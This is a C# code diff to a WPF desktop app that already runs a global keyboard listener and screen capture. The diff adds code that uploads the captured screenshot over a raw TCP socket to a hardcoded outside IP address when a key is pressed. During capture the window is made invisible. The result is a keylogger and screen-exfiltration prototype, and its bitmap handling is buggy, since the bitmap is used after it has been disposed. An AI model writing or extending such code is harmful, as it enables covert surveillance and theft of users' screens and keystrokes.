@@ -15,9 +15,10 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Drawing;
 using System.Drawing.Imaging;
-
-
-
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Runtime.InteropServices;
 
 namespace WpfApplication1
 {
@@ -28,6 +29,7 @@ namespace WpfApplication1
     {
         bool startPressed = false;
         private LowLevelKeyboardListener _listener;
+        Bitmap bmp;
 
         public MainWindow()
         {
@@ -52,12 +54,18 @@ namespace WpfApplication1
             if (startPressed)
             {
                 this.textBox_DisplayKeyboardInput.Text += e.KeyPressed.ToString();
-
+               
                 if (e.KeyPressed.ToString() == "H")
                 {
                     System.Console.WriteLine("screenshot!");
                     capture();
                     //take the screenshot
+                }
+
+                if (e.KeyPressed.ToString() == "S")
+                {
+                    System.Console.WriteLine("Trying send the image");
+                    sendImage();
                 }
             }
 
@@ -91,7 +99,7 @@ namespace WpfApplication1
             double screenWidth = SystemParameters.VirtualScreenWidth;
             double screenHeight = SystemParameters.VirtualScreenHeight;
 
-            using (Bitmap bmp = new Bitmap((int)screenWidth,
+            using (bmp = new Bitmap((int)screenWidth,
                  (int)screenHeight))
             {
                 using (Graphics g = Graphics.FromImage(bmp))
@@ -100,13 +108,100 @@ namespace WpfApplication1
                     Opacity = .0;
                     g.CopyFromScreen((int)screenLeft, (int)screenTop, 0, 0, bmp.Size);
                     bmp.Save("capturefile.png");///save the image to
-                    
                     Opacity = 1;
                 }
 
             }
         }
 
+        private void sendImage()
+        {
+            byte[] data = new byte[1024];
+            int sent;
+            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("128.95.31.226"), 2004); 
+
+            Socket server = new Socket(AddressFamily.InterNetwork,
+                            SocketType.Stream, ProtocolType.Tcp);
+
+            try
+            {
+                server.Connect(ipep);
+            }
+            catch (SocketException e)
+            {
+                Console.WriteLine("Unable to connect to server.");
+                Console.WriteLine(e.ToString());
+                Console.ReadLine();
+            }
+
+
+            //Bitmap bmp = new Bitmap("c:\\eek256.jpg");
+
+            //MemoryStream ms = new MemoryStream();
+            // Save to memory using the Jpeg format
+            //bmp.Save(ms, ImageFormat.Jpeg);
+            MemoryStream memory = new MemoryStream();
+            //Bitmap newBitmap = new Bitmap(bmp);
+            //bmp.Dispose();
+            //bmp = null;
+            //do something
+            //bmp.Save(memory, ImageFormat.Jpeg);
+
+            //byte[] bytes = ConvertBitMapToByteArray(bmp);
+            //byte[] bytes = ImageToByte(bmp);
+            byte[] bytes = BitmapToByteArray(bmp);
+            //MemoryStream ms = new MemoryStream();
+            //bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+            // Byte[] bytes = ms.ToArray();
+
+            // read to end
+            //byte[] bmpBytes = ms.GetBuffer();
+            //bmp.Dispose();
+            //ms.Close();
+
+            sent = SendVarData(server, bytes);
+
+            Console.WriteLine("Disconnecting from server...");
+            server.Shutdown(SocketShutdown.Both);
+            server.Close();
+            Console.ReadLine();
+        }
+        private int SendVarData(Socket s, byte[] data)
+        {
+            int total = 0;
+            int size = data.Length;
+            int dataleft = size;
+            int sent;
+
+            byte[] datasize = new byte[4];
+            datasize = BitConverter.GetBytes(size);
+            sent = s.Send(datasize);
+
+            while (total < size)
+            {
+                sent = s.Send(data, total, dataleft, SocketFlags.None);
+                total += sent;
+                dataleft -= sent;
+            }
+            return total;
+        }
+
+        public byte[] ConvertBitMapToByteArray(Bitmap bitmap)
+        {
+            byte[] result = null;
+            if (bitmap != null)
+            {
+                MemoryStream stream = new MemoryStream();
+                bitmap.Save(stream, bitmap.RawFormat);
+                result = stream.ToArray();
+            }
+            return result;
+        }
+        public static byte[] ImageToByte(Bitmap img)
+        {
+            ImageConverter converter = new ImageConverter();
+            return (byte[])converter.ConvertTo(img, typeof(byte[]));
+        }
         //public static void Save(this BitmapImage image, string filePath)
         //{
         //    BitmapEncoder encoder = new PngBitmapEncoder();
@@ -117,7 +212,29 @@ namespace WpfApplication1
         //        encoder.Save(fileStream);
         //    }
         //}
+        public static byte[] BitmapToByteArray(Bitmap bitmap)
+        {
 
+            BitmapData bmpdata = null;
+
+            try
+            {
+                bmpdata = bitmap.LockBits(new System.Drawing.Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadOnly, bitmap.PixelFormat);
+                int numbytes = bmpdata.Stride * bitmap.Height;
+                byte[] bytedata = new byte[numbytes];
+                IntPtr ptr = bmpdata.Scan0;
+
+                Marshal.Copy(ptr, bytedata, 0, numbytes);
+
+                return bytedata;
+            }
+            finally
+            {
+                if (bmpdata != null)
+                    bitmap.UnlockBits(bmpdata);
+            }
+
+        }
 
 
 
